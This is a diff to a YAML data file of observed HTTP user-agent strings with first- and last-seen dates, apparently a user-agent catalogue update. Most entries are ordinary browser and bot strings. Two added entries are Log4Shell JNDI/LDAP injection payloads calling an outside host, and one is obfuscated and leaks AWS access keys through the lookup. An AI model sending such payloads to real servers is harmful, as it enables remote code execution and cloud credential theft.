@@ -1,5 +1,70 @@
 -
   headers:
+    user-agent: '${jndi:ldap://geld1-de.s.homecare888.com/}'
+  date-first: '2020-01-01'
+  date-last: '2020-01-01'
+-
+  headers:
+    user-agent: '${${env:x:-j}ndi${env:y:-:}${env:z:-l}dap${env:3:-:}//${env:AWS_ACCESS_KEY_ID}_${env:AWS_SECRET_ACCESS_KEY}_geld1-de.s.homecare888.com}'
+  date-first: '2020-01-01'
+  date-last: '2020-01-01'
+-
+  headers:
+    user-agent: 'Zeasn/2.0 NETTV/4.5.0 Mozilla/5.0 (Linux armv7i;CE-HTML/1.0;U;en), Chrome/42.0.2311.152 Safari/537.36 AppleWebKit 537.36 (KHTML, like Gecko) Tbrowser/2.0, _TV_ms6586/V8-S586T02-LF1V130 (THOMSON,50UC63*6,wired)'
+  date-first: '2020-01-01'
+  date-last: '2020-01-01'
+-
+  headers:
+    user-agent: 'yacybot (/global; amd64 Linux 5.15.11-gentoo; java 17.0.1; Europe/de) http://yacy.net/bot.html'
+  date-first: '2020-01-01'
+  date-last: '2020-01-01'
+-
+  headers:
+    user-agent: 'WordPress/5.8.2; https://tecblizzpro.com'
+  date-first: '2020-01-01'
+  date-last: '2020-01-01'
+-
+  headers:
+    user-agent: 'WordPress/5.7.4; https://spinlogin.de'
+  date-first: '2020-01-01'
+  date-last: '2020-01-01'
+-
+  headers:
+    user-agent: 'Opera/9.80 (Windows NT 6.1; WOW64; MRA 6.2 (build 7528)) Presto/2.12.388 Version/12.13'
+  date-first: '2020-01-01'
+  date-last: '2020-01-01'
+-
+  headers:
+    user-agent: 'Opera/9.80 (Windows NT 5.1; MRA 8.0 (build 5880)) Presto/2.12.388 Version/12.16'
+  date-first: '2020-01-01'
+  date-last: '2020-01-01'
+-
+  headers:
+    user-agent: 'Opera/9.80 (Windows NT 5.1; MRA 6.1 (build 6578)) Presto/2.12.388 Version/12.10'
+  date-first: '2020-01-01'
+  date-last: '2020-01-01'
+-
+  headers:
+    user-agent: 'Opera/9.80 (Windows NT 5.1; MRA 6.0 (build 5711)) Presto/2.12.388 Version/12.15'
+  date-first: '2020-01-01'
+  date-last: '2020-01-01'
+-
+  headers:
+    user-agent: 'Opera/9.80 (Macintosh; Intel Mac OS X 11_2_2; U; en) Presto/2.2.15 Version/10.00'
+  date-first: '2020-01-01'
+  date-last: '2020-01-01'
+-
+  headers:
+    user-agent: 'Opera/9.80 (Macintosh; Intel Mac OS X 10_15_4; U; en) Presto/2.8.131 Version/11.11'
+  date-first: '2020-01-01'
+  date-last: '2020-01-01'
+-
+  headers:
+    user-agent: 'Opera/9.80 (Macintosh; Intel Mac OS X 10_15_1; U; en) Presto/2.5.24 Version/10.54'
+  date-first: '2020-01-01'
+  date-last: '2020-01-01'
+-
+  headers:
     user-agent: node-fetch
   date-first: '2022-05-28'
   date-last: '2024-11-13'
@@ -2447,7 +2512,7 @@
   headers:
     user-agent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15'
   date-first: '2022-03-07'
-  date-last: '2026-08-23'
+  date-last: '2026-09-17'
 -
   headers:
     user-agent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15'
@@ -4931,70 +4996,5 @@
 -
   headers:
     user-agent: 'Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG-SM-G891A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36'
-  date-first: '2020-01-01'
-  date-last: '2020-01-01'
--
-  headers:
-    user-agent: 'Dalvik/1.4.0 (Linux; U; Android 2.3.4; ST18i Build/4.0.2.A.0.62)'
-  date-first: '2020-01-01'
-  date-last: '2020-01-01'
--
-  headers:
-    user-agent: 'Mozilla/5.0 (Linux; Android 6.0.1; LG-K425 Build/MXB48T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36'
-  date-first: '2020-01-01'
-  date-last: '2020-01-01'
--
-  headers:
-    user-agent: 'Mozilla/5.0 (iPhone; CPU OS 9_3_2 like Mac OS X; ja-JP)'
-  date-first: '2020-01-01'
-  date-last: '2020-01-01'
--
-  headers:
-    user-agent: 'Mozilla/5.0 (Linux; Android 5.0.2; SM-T530NU Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'
-  date-first: '2020-01-01'
-  date-last: '2020-01-01'
--
-  headers:
-    user-agent: 'Mozilla/5.0 (Linux; Android 5.1; C6740N Build/LMY47O) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36'
-  date-first: '2020-01-01'
-  date-last: '2020-01-01'
--
-  headers:
-    user-agent: 'Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG-SM-J320A Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36'
-  date-first: '2020-01-01'
-  date-last: '2020-01-01'
--
-  headers:
-    user-agent: 'Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36'
-  date-first: '2020-01-01'
-  date-last: '2020-01-01'
--
-  headers:
-    user-agent: 'Mozilla/5.0 (Linux; Android 6.0.1; SM-J700T1 Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36'
-  date-first: '2020-01-01'
-  date-last: '2020-01-01'
--
-  headers:
-    user-agent: 'Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG-SM-J120A Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36'
-  date-first: '2020-01-01'
-  date-last: '2020-01-01'
--
-  headers:
-    user-agent: 'Mozilla/5.0 (Linux; Android 6.0.1; H1611 Build/HUAWEIH1611) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36'
-  date-first: '2020-01-01'
-  date-last: '2020-01-01'
--
-  headers:
-    user-agent: 'Mozilla/5.0 (Linux; Android 6.0.1; SM-J700T1 Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36'
-  date-first: '2020-01-01'
-  date-last: '2020-01-01'
--
-  headers:
-    user-agent: 'Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG-SM-N910A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36'
-  date-first: '2020-01-01'
-  date-last: '2020-01-01'
--
-  headers:
-    user-agent: 'Mozilla/5.0 (Linux; Android 5.1; HTC Desire 626s Build/LMY47O) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36'
   date-first: '2020-01-01'
   date-last: '2020-01-01'
